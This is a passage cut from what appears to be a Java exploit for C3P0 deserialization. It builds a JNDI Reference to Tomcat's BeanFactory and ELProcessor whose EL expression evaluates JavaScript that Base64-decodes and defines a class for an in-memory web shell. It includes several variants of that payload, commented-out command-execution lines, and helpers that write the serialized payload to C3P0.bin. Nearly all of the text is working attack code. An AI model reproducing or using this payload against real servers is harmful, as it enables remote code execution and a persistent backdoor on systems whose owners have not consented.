java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var base64c= clsBase64.getDeclaredConstructor();base64c.setAccessible(true);var base64i = base64c.newInstance();var decoder = clsBase64.getDeclaredMethod(\\'getDecoder\\').invoke(base64i);bytecode = decoder.getClass().getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = (new java.lang.String(\\'a\\').getBytes().getClass());var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var clsString = classLoader.loadClass(\\'java.lang.String\\');var bytecodeBase64 = \\'"+memshell+"\\';var bytecode;var clsBase64 = classLoader.loadClass(\\'java.util.Base64\\');var base64c= clsBase64.getDeclaredConstructor();base64c.setAccessible(true);var base64i = base64c.newInstance();var decoder = clsBase64.getDeclaredMethod(\\'getDecoder\\').invoke(base64i);bytecode = decoder.getClass().getMethod(\\'decode\\', clsString).invoke(decoder, bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = bytecode.getClass();var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', [clsByteArray, clsInt, clsInt]);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            expression="''.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('js').eval('var classLoader = java.lang.Thread.currentThread().getContextClassLoader();var bytecodeBase64 = \\'"+memshell+"\\';var bytecode=java.util.Base64.getDecoder().decode(bytecodeBase64);var clsClassLoader = classLoader.loadClass(\\'java.lang.ClassLoader\\');var clsByteArray = bytecode.getClass();var clsInt = java.lang.Integer.TYPE;var defineClass = clsClassLoader.getDeclaredMethod(\\'defineClass\\', clsByteArray, clsInt, clsInt);defineClass.setAccessible(true);var clazz = defineClass.invoke(classLoader,bytecode,new java.lang.Integer(0),new java.lang.Integer(bytecode.length));clazz.newInstance();')";
            //            String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(\"var s = [3];s[0] = \\\"cmd\\\";s[1] = \\\"/c\\\";s[2] = \\\"calc\\\";var p = java.lang.Runtime.getRuntime().exec(s);var sc = new java.util.Scanner(p.getInputStream(),\\\"GBK\\\").useDelimiter(\\\"\\\\\\\\A\\\");var result = sc.hasNext() ? sc.next() : \\\"\\\";sc.close();result;\")";
//            String elcode = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"js\").eval(pageContext.request.getParameter(\"ant\"))";
            ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", (String)null, "", "", true, "org.apache.naming.factory.BeanFactory", (String)null);
            resourceRef.add(new StringRefAddr("forceString", "x=eval"));
            resourceRef.add(new StringRefAddr("x", expression));
            return resourceRef;
        }

        @Override
        public PooledConnection getPooledConnection() throws SQLException {
            return null;
        }

        @Override
        public PooledConnection getPooledConnection(String user, String password) throws SQLException {
            return null;
        }

        @Override
        public PrintWriter getLogWriter() throws SQLException {
            return null;
        }

        @Override
        public void setLogWriter(PrintWriter out) throws SQLException {

        }

        @Override
        public void setLoginTimeout(int seconds) throws SQLException {

        }

        @Override
        public int getLoginTimeout() throws SQLException {
            return 0;
        }

        @Override
        public Logger getParentLogger() throws SQLFeatureNotSupportedException {
            return null;
        }
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(new FileOutputStream("C3P0.bin"));
        objectOutputStream.writeObject(obj);
    }

    public static void unserialize() throws IOException, ClassNotFoundException {
        ObjectInputStream objectInputStream = new ObjectInputStream(new FileInputStream("C3P0.bin"));
        objectInputStream.readObject();
    }
}
